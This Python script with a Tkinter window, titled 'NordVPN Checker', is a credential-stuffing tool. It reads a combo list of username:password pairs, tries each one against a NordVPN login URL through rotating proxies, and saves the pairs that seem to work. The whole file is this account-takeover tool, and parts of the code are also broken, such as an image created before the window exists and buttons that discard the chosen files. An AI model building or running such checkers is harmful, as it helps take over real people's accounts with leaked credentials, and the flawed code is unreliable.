import requests
import os
import tkinter as tk
from tkinter import filedialog
from PIL import Image, ImageTk

# Create logo image
logo_image = tk.PhotoImage(file="nordvpn_logo.png")

# Function to check NordVPN account
def check_account(username, password, proxy):
    url = "https://nordaccount.com/login/identifier?_ga=2.80401559.163319831.1719281788-1672058283.1719281787&challenge=2%7Cc3768e43eb9441bfb9ae49bfeab5a68c"
    post_fields = {"username": username, "password": password}
    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    try:
        response = requests.post(url, data=post_fields, proxies=proxies)
        if "success" in response.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return False

# Function to select files using file picker
def select_file():
    root = tk.Tk()
    root.withdraw()
    file_path = filedialog.askopenfilename()
    return file_path

# Create main window
root = tk.Tk()
root.title("NordVPN Checker")

# Create logo label
logo_label = tk.Label(root, image=logo_image, bg="#032B44")
logo_label.image = logo_image
logo_label.pack(pady=20)

# Create label
label = tk.Label(root, text="NordVPN Checker", font=("Arial", 24), fg="#032B44")
label.pack(pady=10)

# Create buttons
combo_list_button = tk.Button(root, text="Select Combo List File", command=lambda: select_file())
combo_list_button.pack(pady=10)

proxy_list_button = tk.Button(root, text="Select Proxy List File", command=lambda: select_file())
proxy_list_button.pack(pady=10)

# Start main loop
root.mainloop()

# Select combo list file
print("Select combo list file:")
combo_list_file = select_file()

# Select proxy list file
print("Select proxy list file:")
proxy_list_file = select_file()

# Load combo list and proxy file
combo_list = []
with open(combo_list_file, "r") as f:
    for line in f:
        username, password = line.strip().split(":")
        combo_list.append((username, password))

proxy_list = []
with open(proxy_list_file, "r") as f:
    for line in f:
        proxy_list.append(line.strip())

# Check accounts and delete non-functional ones
functional_accounts = []
for username, password in combo_list:
    for proxy in proxy_list:
        if check_account(username, password, proxy):
            functional_accounts.append(f"{username}:{password}")
            break

# Write functional accounts to a new file
with open("functional_accounts.txt", "w") as f:
    for account in functional_accounts:
        f.write(account + "\n")

print("Non-functional accounts deleted from the combo list.")
